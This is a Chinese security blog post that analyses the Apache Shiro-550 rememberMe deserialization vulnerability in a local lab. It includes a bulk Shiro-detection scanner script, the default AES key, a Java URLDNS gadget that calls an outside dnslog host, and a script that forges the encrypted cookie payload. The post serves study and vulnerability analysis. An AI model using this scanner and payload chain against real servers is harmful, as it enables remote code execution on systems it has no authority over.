#  JAVA安全-Shiro-550反序列化漏洞分析   
原创 菜狗安全  菜狗安全   2024-05-20 22:12  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQ8F0v8Ec2COibJU7M9icEXicUDx5xbKpyIndNCjNAqr5H4kFbcN4ZPYPRQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQq00xicAFjNabWVJe3x8NA9iaxoepwgibI4xmplUPokbqGKHpVJDm9bR3g/640?wx_fmt=gif&from=appmsg "")  
  
点击上方蓝字·关注我们  
  
  
免责声明  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
由  
于  
传  
播  
、  
利  
用  
本  
公  
众  
号  
菜  
狗  
安  
全  
所  
提  
供  
的  
信  
息  
而  
造  
成  
的  
任  
何  
直  
接  
或  
者  
间  
接  
的  
后  
果  
及  
损  
失  
，  
均  
由  
使  
用  
者  
本  
人  
负  
责  
，  
公  
众  
号  
菜  
狗  
安  
全  
及  
作  
者  
不  
为  
此  
承  
担  
任  
何  
责  
任  
，  
一  
旦  
造  
成  
后  
果  
请  
自  
行  
承  
担  
！  
如  
有  
侵  
权  
烦  
请  
告  
知  
，  
会  
立  
即  
删  
除  
并  
致  
歉  
。  
  
文章目录  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
```
一、前置知识
    Shiro介绍
    漏洞环境搭建
二、漏洞利用及成因分析
    工具漏洞复现
    shiro检测
    shiro密钥
      调试中的小插曲
      加密流程分析   
    手工漏洞复现
三、总结
```  
  
介绍  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
**Shiro**  
是一个功能强大且易于使用的Java安全框架，用于身份验证、授权、加密和会话管理等安全领域。  
它提供了一个全面的安全解决方案，可以集成到任何Java应用程序中，包括Web应用程序、RESTful服务、移动应用程序等。  
  
以下是Shiro的一些主要功能和特点：  
1. **身份验证（Authentication）**  
：Shiro可以处理用户的身份验证，支持多种认证方式，包括用户名密码认证、基于令牌的认证、LDAP认证等。  
  
1. **授权（Authorization）**  
：Shiro提供了灵活的授权机制，可以通过简单的配置来定义用户对资源的访问权限，支持角色（Role）和权限（Permission）的管理。  
  
1. **加密（Cryptography）**  
：Shiro提供了各种常见的加密算法和工具类，用于保护敏感数据的安全性，如密码加密、数据加密等。  
  
1. **会话管理（Session Management）**  
：Shiro可以管理用户会话，包括Session的创建、销毁、过期处理等，同时支持分布式环境下的会话共享和集中管理。  
  
1. **Web集成**  
：Shiro提供了与各种Web框架的集成支持，包括Spring MVC、Struts、Servlet等，可以轻松地将Shiro集成到Web应用程序中进行安全控制。  
  
1. **易于扩展**  
：Shiro的设计模式和API都非常灵活，易于扩展和定制，开发人员可以根据实际需求进行定制化开发，满足复杂的安全需求。  
  
总的来说，Shiro是一个功能丰富、易于使用且灵活扩展的安全框架，为Java应用程序提供了全面的安全保护，帮助开发人员构建安全可靠的应用程序。  
  
漏洞环境搭建  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
加载完成后，配置tomcat，添加工件![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQBqialJlLzD3S5GnWR7NkL7AP1DUB7K6ng9sWJh4EdPmerhusuQotk4g/640?wx_fmt=png&from=appmsg "")  
  
运行项目,如果报错检查SDK版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQUmRa4W5rMY6Y3PyrFLoEKMNZaPx10DhnKgBMUnibWnbX8LRgNejfVnQ/640?wx_fmt=png&from=appmsg "")  
  
启动项目后访问自己tomcat的端口跟上自己设置的路径访问，默认就是  
http://localhost:8080/samples_web_war_exploded/  
，返回下面页面即搭建完成  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQXqLic3rcx9Jz8qmvvanySwZhOtK9v52UMXNbHdKnTerDs2Ds9ZrYdOw/640?wx_fmt=png&from=appmsg "")  
  
点击account page跳转到登入页面![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQicyftgdt6j3d8NxVcSN0cfSlmwCCjheDoJpJ88f5eR8zBXpwD7F2hSQ/640?wx_fmt=png&from=appmsg "")  
  
  
我们这里简单看一下  
  
既然是反序列化漏洞，那么得有我们能传入序列化字符串的地方吧，他这里有给几个测试账号，使用burp抓取一下登入数据包，登入的时候记得勾选Remember Me这个是保存登入信息的，勾选后会将Cookie写到客户端并保存下来，关闭浏览器再重新打开；会发现浏览器还是记住你的，这里各位可以自己做一下实验，不勾选Remember Me，登入，然后关闭浏览器重新访问看看是否要登入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQdaV8noOVDyFnc0seW5zLSwMNe4gicgn04lfW4MftwDsD6f3lS4pDGUg/640?wx_fmt=png&from=appmsg "")  
  
我这里是勾选了，可以看到它的数据包中有个rememberMe字段，rememberMe=这个字段也是在黑盒情况下判断对方是否使用shiro的有个判断方式，这里我们可控的点就是这个rememberMe，等下分析一下这段数据是什么  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
  
我们可以看一下网上关于shiro反序列化的利用，根据网上工具的利用顺序一步步剖析shiro反序列化漏洞的成因  
  
第一步、打开shiro反序列化利用工具，输入目标url  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQw8dBPPf1nLQE3n5ibGiaN9jzwt7wQbiaFRBNJyic50WWqwKkfMqXibTlGxg/640?wx_fmt=png&from=appmsg "")  
  
第二步、检测密钥，它这里发现shiro框架，输入指定密钥![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQmfdgTjsH0yHkFs8VBTqUWnkqmib9NaUciausYtjMGVBkiaHIURXt1nz8A/640?wx_fmt=png&from=appmsg "")  
  
  
第三步、爆破密钥(因为我们不知道密钥嘛)，它这里说爆破出了密钥![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQ7kDYvwJ8G0PibWrEJuOYNtneZus4Iiajlv04SGXsBta2xLvEjiaWEfFrg/640?wx_fmt=png&from=appmsg "")  
  
  
第四步、爆破利用链以及回显，它说发现构造链  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQVVicdtQbZGDgIJX4jOpXA35fV8RFW1FYYkswk2icquLOzYohQ1RPyhkQ/640?wx_fmt=png&from=appmsg "")  
  
第五步、使用工具执行命令，执行个计算器，发现成功执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQU6uNuFleQ7XrnqYXnlmupkbp3ouG1Fxs7fTcrUw0twcVUETVmHU9Iw/640?wx_fmt=png&from=appmsg "")  
  
自此漏洞复现完成，我们来理一下漏洞复现流程  
  
**检测是否是shiro框架-->爆破密钥-->爆破利用链-->执行命令**  
  
这就是这个漏洞利用的一套完整流程了，那么接下来我们就根据这个流程一步步剖析它  
  
Shiro检测  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
第一种：关于shiro的判断，前面也说到了，可以看数据包中是否存在rememberMe=  
  
第二种：直接发送原数据包，返回的数据中不存在关键字，可以通过在发送数据包的cookie中增加字段：rememberMe=deleteMe，然后查看返回数据包中是否存在关键字。  
  
这里给个检测shiro框架的py脚本  
```
import requests
import sys,re
import threadpool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()


def exp(line):
    header={
    'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
    'Cookie':'a=1;rememberMe=1'

    }

    check_one="rememberMe" #场景1
    check_two="deleteMe" #场景2

    isExist = False

    with open('ScanResult.txt',"a") as f:
        if 'http' not in line:
            line = 'http://'+line
        try:
            x = requests.head(line,headers=header,allow_redirects=False,verify=False,timeout=6) #场景4
            y = str(x.headers)
            z = checkRe(y)

            a = requests.head(line,headers=header,verify=False,timeout=6) #场景5
            b = str(a.headers)
            c = checkRe(b)

            if check_one in y or z or check_two in y or c:
                isExist = True

            if isExist:
                print("[+ "+"!!! 存在shiro: "+"状态码: "+str(x.status_code)+"   url: "+line)
                f.write(line+"\n")
            else:
                print("[- "+"不存在shiro  "+"状态码: "+str(x.status_code)+"  url: "+line)

        except Exception as httperror:
            print("[- "+"目标超时, 疑似不存活: "+"  url: "+line)



def checkRe(target): #场景3

    pattern = re.compile(u'^re(.*?)Me')
    result  = pattern.search(target)
    if result:
        return True
    else:
        return False

def multithreading(funcname, params=[], filename="ip.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params

            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)

    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], "check_url.txt", 10)  # 默认15线程
    print("全部check完毕，请查看当前目录下的shiro.txt")


if __name__ == "__main__":
    main()
```  
  
Shiro密钥  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
这个密钥是什么呢，这个就得分析一下rememberMe字段中的数据了  
  
既然我们现在是要看rememberMe字段的数据是咋来的，就要知道是哪个方法操作它，在网上查看了资料后说是shiro登入成功后会触发rememberMeSuccessfulLogin方法，我们全局搜索这个方法![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQoQ7aauzb5FgiaA6qicP6bhxnBjSnnFbtAyUOIpXoAuNERhMGjs9iayJwQ/640?wx_fmt=png&from=appmsg "")  
  
  
定位到rememberMeSuccessfulLogin方法，然后在这个方法这里下个断点动态调试一下数据操作的流程，数据是登入成功后获取的，那么我们浏览器登入一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlKf7VicSVJibHAUibnGS7EWmy982fyGse5lkia0ryIeqBaOshjjD1tkL5w/640?wx_fmt=png&from=appmsg "")  
  
这里断点后以调试模式启动tomcat  
  
调试中的小插曲  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
我这里遇到了个问题，调试模式启动的时候会报**运行配置停止之前未连接应用程序服务器，原因: 无法在 localhost:1099 处 ping**  
  
**解决方法**  
  
找到tomcat的配置文件catalina.bat，在bin目录下，打开找到![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQXCPRD97eJbnIFGl0AppxsH4f4ZB0fYJOJTadNbRegkB3eTicSkv2nQg/640?wx_fmt=png&from=appmsg "")  
  
  
把红框框起来的这行删除，重新调试启动tomcat即可  
  
加密流程分析  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
解决完问题后，我们接着跟代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQuWQsy5bLneaia1zHuOLaELPlRIrWNRwvV0NEP1CYz281ticFh3ksia49A/640?wx_fmt=png&from=appmsg "")  
  
它这里触发了**getRememberMeManager**方法，我们看下这个方法是干什么的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQ671PbB5u7jQpFnnFU1WtnejJzoIz0vibGMzjXvfMyicF67iakkOocjUtw/640?wx_fmt=png&from=appmsg "")  
  
它返回一个**rememberMeManager**赋值给rmm，然后判断**rmm**是否为空，这个**rememberMeManager**是判断我们在登入的时候有没有勾选**Remember Me**  
的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQ79khBo2Dp4rJ2INFzjn4DVxgrDC3XdyYTQqjeEicpsg0sEUaqJfOFKw/640?wx_fmt=png&from=appmsg "")  
  
接着会触发**onSuccessfulLogin**，它这里面有三个值**subject**, **token**, **info**，其中**subject**是判断勾选**Remember Me**  
的，**token**还不是很清楚，**info**的值是**root**，是我们登入的**用户名**![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQp3z5f2tdkrVib3SEOsIh2VDVeLvmfSqcs1oHWRMxIricXfft13a6yOWw/640?wx_fmt=png&from=appmsg "")  
  
  
接着来到**login**方法，看字面意思是处理登入的，我们接着往下跟  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQXGxsxGuMWbXN6lDrIO6gfEHWZ0lBcnyk6sJRIfia0cgeibSLeJXEpJPg/640?wx_fmt=png&from=appmsg "")  
  
中间一大堆是处理http请求的代码，跟到**convertPrincipalsToBytes**它里面有个  
**serialize**方法，我们跟进![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQdPNwCbJpYXKmz0ghmBibicGMAl22JUgeUgwKN0rySFOKCuK6K1Vu3fHA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQ1WHnaunibxueia8Jrh85zEjHzD9IpYoFSF6l5pN1Qf7k5DdE41ymDkKw/640?wx_fmt=png&from=appmsg "")  
  
这就是它实现序列化功能的代码了，shiro使用的是java自带的序列化接口，这里可以看到它序列化的内容是我们登入时的用户名，也就是说是我们可控的![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQCzOSgsee0iaDibo3Ts9icuHEibcLzcKicmLKM0ctDxXEBt0goiaLgMXkIxxA/640?wx_fmt=png&from=appmsg "")  
  
**serialize**执行完后，返回了个**bytes**，那么这个应该就是序列化后的数据了，接着往下看，它接下来又会触发**encrypt**这个方法，字面意思应该是做加密的，并且可以看到它的参数是我们序列化后的字符串，跟进![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQnT9s8ojXNVXxedkx76ECTkx2xao73iayJBHIvMFL4f4zySt6TQf4mIA/640?wx_fmt=png&from=appmsg "")  
  
  
这里又触发了一个**encrypt**方法，进入这个方法![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQs1jsI8D8mQgw4U2WhMKJKz631oncXybxuzMHnTicxqjPjvS2Hiaict6kA/640?wx_fmt=png&from=appmsg "")  
  
  
执行到这一步，发现底下多了几个参数，我们看下![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQTVTawwv89umsFgib1TZNMBcHfvKQJFAnAj63sZjGGKk7dhNPJ0YHXzQ/640?wx_fmt=png&from=appmsg "")  
  
  
**this**中有个**algorithmname**，翻译一下是**算法名称**的意思，那么他这里采用的加密算法应该就是  
**AES**了，在**AES****加密**中有五种加密模式CBC,ECB,CTR,CFB,OFB，这里也提示了，使用的应该是  
**CBC**加密模式，还有两个值**key**和**ivBytes**，这个**key**字面意思应该就是**AES**加密的密钥了，**ivbytes**应该是加密时使用的偏移量(跟到后面发现没用上)，我们继续往下![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQsysHNZK4liaovgYxg8uezvcfXQlr6xyMlLwNF9iafBx68tekic7oCC6Cg/640?wx_fmt=png&from=appmsg "")  
  
触发方法**crypt**方法![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQjRLMknXicHW0bor2Ia4nzDicm3DqDGSzsryu9tOZGcTtGJ5tyIiamYicpQ/640?wx_fmt=png&from=appmsg "")  
  
  
接着触发**initNewCipher**方法，这个方法里面用到了**SecretKeySpec**，它是执行密钥操作的，到这里就没必要继续跟了，它到最后还有一次**base64**加密，然后结果就是**rememberMe**字段中的数据了  
  
到这里很清楚的，shiro数据的传输流程是  
  
**登入流程：登入数据 --> 序列化 --> AES加密 --> base64加密 -->rememberMe**  
  
**认证流程 : rememberMe --> base64解密 --> AES解密 -->反序列化 -->登入数据**  
  
  
那么shiro的密钥实际上就是AES加密所使用的密钥，这里实验一下，刚刚在跟代码的时候获取的key的值是下面这个  
```
[-112, -15, -2, 108, -116, 100, -28, 61, -99, 121, -104, -120, -59, -58, -102, 104]
```  
  
然后工具爆破出来的密钥是  
```
kPH+bIxk5D2deZiIxcaaaA==
```  
  
我们使用py脚本对获取到的ascii数组进行base64转换  
```
import base64
  
ascii_array= [-112, -15, -2, 108, -116, 100, -28, 61, -99, 121, -104, -120, -59, -58, -102, 104]
byte_array = [x +256 if x <0 else x for x in ascii_array]
byte_array = bytes(byte_array)
base64_array = base64.b64encode(byte_array)

print(base64_array)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQXlz8ysDrQ3kTzuyaGXeXlddBxbpu8mQQERaPtibWbeQRT74F49W8sUg/640?wx_fmt=png&from=appmsg "")  
  
执行出来的结果可以看到跟爆破出来的密钥是一样的，其实这个密钥在代码中是可以找到的，可以全局搜索DEFAULT_CIPHER_KEY_BYTES  
关键字在这个文件中org/apache/shiro/mgt/AbstractRememberMeManager.java  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQ9yHDOiay1qbVqTd03n2odoLKSc5bVOt4lJlHeiaRwjuibUeINLwQj3h9g/640?wx_fmt=png&from=appmsg "")  
  
手工漏洞复现  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
分析完成后，按照我们的思路就要开始构造利用链了  
  
序列化数据构造  
```
package com.example.javademo;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class SerializeDemo {
    public static void main(String[] args) throws Exception {

        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
        URL url = new URL("http://cwkhb.z9z.top"); //dnslogd地址
       
        //通过反射获取 hashCode方法
        Field hashCode = Class.forName("java.net.URL").getDeclaredField("hashCode");
        hashCode.setAccessible(true);//绕过Java语言权限控制检查的权限
        hashCode.set(url,0xdeadbeef);//hashCode第一次默认为 -1 会触发执行dns payload,所以这里设置为任意值
        objectObjectHashMap.put(url,"time");//这里传入任意值，原因同上

        hashCode.set(url,-1);//重新设置为-1，确保反序列化能触发

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("cc.txt"));
        objectOutputStream.writeObject(objectObjectHashMap); //将序列化内容写入bin文件中
    }
}
```  
  
执行完成后，生成cc.txt(序列化内容)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQWeU2OyCy6g3Rxob4gnrFB9KMTxBeVgU6gWgfHq4ohVxBz3WaYxplQA/640?wx_fmt=png&from=appmsg "")  
  
然后再使用py脚本对序列化数据进行AES和base64加密  
```
from Crypto.Cipher import AES
import uuid
import base64


def convert_bin(file):
    with open(file, 'rb') as f:
        return f.read()


def AES_enc(data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data))).decode()
    return ciphertext


if __name__ == "__main__":
    data = convert_bin("cc.txt")
    print(AES_enc(data))
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQoibsGwbicu64ER3CWdHcIKJZVrlTFQDrqp0CUIrbvzmYv0AbAfgFuUyw/640?wx_fmt=png&from=appmsg "")  
  
运行后返回加密后的数据，我们把它替换到rememberMe字段中，测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlwzegZDUIPXwbwVrLpQdma8wdHNfwhaE6Mw5AR3xdhfyCH4PLsJkSQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQHwyUN5WsRqfN20zgOtHlkDJFRwxZQApOTF335FCFI157XR2iaW0s3Pg/640?wx_fmt=png&from=appmsg "")  
  
**dnslog**接收到请求，手工漏洞复现完成  
  
总结  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPn95ib9ymUmhveibln9jknMsQlnlDDWnVf3lLPQKwV2tMecso0BbBNq5KMDKwl87klYcXjs65G1GWPA/640?wx_fmt=gif&from=appmsg "")  
  
  
其实在上面已经说了，shiro-550反序列化漏洞的核心点是  
rememberMe中的数据我们可控，数据采用的是AES加密，而密钥是默认的，所以懂得了它的加密流程和密钥后，我们就可以生成自己想实现功能的序列化字符串加密传输，到shiro中它会按照流程解密，触发我们想要触发的类，在shiro中它使用的是java官方的序列化接口，所以是属于java原生的反序列化漏洞利用。  
  
shiro数据传输流程  
  
**登入流程：登入数据 --> 序列化 --> AES加密 --> base64加密 -->rememberMe**  
  
**认证流程 : rememberMe --> base64解密 --> AES解密 -->反序列化 -->登入数据**  
  
